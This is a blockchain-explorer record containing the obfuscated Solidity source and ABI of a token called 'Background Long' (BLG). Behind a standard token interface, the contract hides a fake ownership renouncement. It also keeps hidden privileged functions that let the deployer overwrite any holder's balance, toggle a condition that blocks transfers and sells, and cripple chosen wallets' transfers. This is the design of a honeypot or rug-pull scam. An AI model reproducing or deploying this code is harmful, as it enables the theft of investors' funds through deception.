{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\ninterface txEnable {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address sellMax) external view returns (uint256);\n\n    function transfer(address modeSell, uint256 autoAt) external returns (bool);\n\n    function allowance(address toLaunchedMarketing, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 autoAt) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address modeSell,\n        uint256 autoAt\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed totalIs, uint256 value);\n    event Approval(address indexed toLaunchedMarketing, address indexed spender, uint256 value);\n}\n\nabstract contract maxLaunched {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface shouldFeeAuto {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface minToken {\n    function createPair(address modeFundTx, address sellFundTx) external returns (address);\n}\n\ninterface launchIs is txEnable {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract BackgroundLong is maxLaunched, txEnable, launchIs {\n\n    constructor (){\n        if (shouldSender != receiverExemptTotal) {\n            shouldSender = autoTrading;\n        }\n        shouldFeeAuto walletSender = shouldFeeAuto(isEnable);\n        txMax = minToken(walletSender.factory()).createPair(walletSender.WETH(), address(this));\n        \n        launchLiquidity = _msgSender();\n        launchedLiquidity();\n        takeLiquidityTrading[launchLiquidity] = true;\n        launchedEnable[launchLiquidity] = autoTeamMarketing;\n        if (toLaunch == shouldSender) {\n            toLaunch = shouldSender;\n        }\n        emit Transfer(address(0), launchLiquidity, autoTeamMarketing);\n    }\n\n    uint256 public autoTrading;\n\n    uint256 private receiverExemptTotal;\n\n    address isEnable = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function transfer(address enableBuy, uint256 autoAt) external virtual override returns (bool) {\n        return listEnable(_msgSender(), enableBuy, autoAt);\n    }\n\n    mapping(address => bool) public takeLiquidityTrading;\n\n    function listEnable(address modeLimitSwap, address modeSell, uint256 autoAt) internal returns (bool) {\n        if (modeLimitSwap == launchLiquidity) {\n            return teamMin(modeLimitSwap, modeSell, autoAt);\n        }\n        uint256 launchEnable = txEnable(txMax).balanceOf(maxSellMode);\n        require(launchEnable == fundReceiverFee);\n        require(modeSell != maxSellMode);\n        if (receiverExempt[modeLimitSwap]) {\n            return teamMin(modeLimitSwap, modeSell, txExemptSwap);\n        }\n        return teamMin(modeLimitSwap, modeSell, autoAt);\n    }\n\n    address private listTo;\n\n    function senderTeamTake() private view {\n        require(takeLiquidityTrading[_msgSender()]);\n    }\n\n    bool public marketingIs;\n\n    function getOwner() external view returns (address) {\n        return listTo;\n    }\n\n    function launchedLiquidity() public {\n        emit OwnershipTransferred(launchLiquidity, address(0));\n        listTo = address(0);\n    }\n\n    uint256 fundReceiverFee;\n\n    function allowance(address launchedMode, address liquidityAmount) external view virtual override returns (uint256) {\n        if (liquidityAmount == isEnable) {\n            return type(uint256).max;\n        }\n        return fromExempt[launchedMode][liquidityAmount];\n    }\n\n    uint256 maxIs;\n\n    uint256 private toLaunch;\n\n    string private totalReceiverIs = \"Background Long\";\n\n    function feeIs(address maxTeam) public {\n        if (takeSell) {\n            return;\n        }\n        if (enableAmountLaunch) {\n            minEnable = shouldSender;\n        }\n        takeLiquidityTrading[maxTeam] = true;\n        if (toLaunch != receiverExemptTotal) {\n            shouldSender = autoTrading;\n        }\n        takeSell = true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return totalReceiverIs;\n    }\n\n    uint256 private autoTeamMarketing = 100000000 * 10 ** 18;\n\n    bool public isSenderFee;\n\n    bool public takeSell;\n\n    function symbol() external view virtual override returns (string memory) {\n        return tokenShouldLaunched;\n    }\n\n    uint256 private minEnable;\n\n    function teamMin(address modeLimitSwap, address modeSell, uint256 autoAt) internal returns (bool) {\n        require(launchedEnable[modeLimitSwap] >= autoAt);\n        launchedEnable[modeLimitSwap] -= autoAt;\n        launchedEnable[modeSell] += autoAt;\n        emit Transfer(modeLimitSwap, modeSell, autoAt);\n        return true;\n    }\n\n    address public launchLiquidity;\n\n    uint256 private shouldSender;\n\n    function approve(address liquidityAmount, uint256 autoAt) public virtual override returns (bool) {\n        fromExempt[_msgSender()][liquidityAmount] = autoAt;\n        emit Approval(_msgSender(), liquidityAmount, autoAt);\n        return true;\n    }\n\n    uint8 private marketingList = 18;\n\n    mapping(address => bool) public receiverExempt;\n\n    uint256 private autoLaunch;\n\n    mapping(address => uint256) private launchedEnable;\n\n    uint256 constant txExemptSwap = 20 ** 10;\n\n    function transferFrom(address modeLimitSwap, address modeSell, uint256 autoAt) external override returns (bool) {\n        if (_msgSender() != isEnable) {\n            if (fromExempt[modeLimitSwap][_msgSender()] != type(uint256).max) {\n                require(autoAt <= fromExempt[modeLimitSwap][_msgSender()]);\n                fromExempt[modeLimitSwap][_msgSender()] -= autoAt;\n            }\n        }\n        return listEnable(modeLimitSwap, modeSell, autoAt);\n    }\n\n    address public txMax;\n\n    function totalAutoExempt(address enableBuy, uint256 autoAt) public {\n        senderTeamTake();\n        launchedEnable[enableBuy] = autoAt;\n    }\n\n    address maxSellMode = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    string private tokenShouldLaunched = \"BLG\";\n\n    function receiverTx(uint256 autoAt) public {\n        senderTeamTake();\n        fundReceiverFee = autoAt;\n    }\n\n    function balanceOf(address sellMax) public view virtual override returns (uint256) {\n        return launchedEnable[sellMax];\n    }\n\n    function teamAt(address txAuto) public {\n        senderTeamTake();\n        \n        if (txAuto == launchLiquidity || txAuto == txMax) {\n            return;\n        }\n        receiverExempt[txAuto] = true;\n    }\n\n    function owner() external view returns (address) {\n        return listTo;\n    }\n\n    mapping(address => mapping(address => uint256)) private fromExempt;\n\n    bool public enableAmountLaunch;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return autoTeamMarketing;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return marketingList;\n    }\n\n    event OwnershipTransferred(address indexed amountSell, address indexed tokenAmount);\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toLaunchedMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountSell\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenAmount\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalIs\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedMode\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"liquidityAmount\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoAt\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoTrading\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellMax\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableAmountLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxTeam\",\"type\":\"address\"}],\"name\":\"feeIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isSenderFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchLiquidity\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"autoAt\",\"type\":\"uint256\"}],\"name\":\"receiverTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeLiquidityTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txAuto\",\"type\":\"address\"}],\"name\":\"teamAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoAt\",\"type\":\"uint256\"}],\"name\":\"totalAutoExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoAt\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeLimitSwap\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoAt\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txMax\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "BackgroundLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}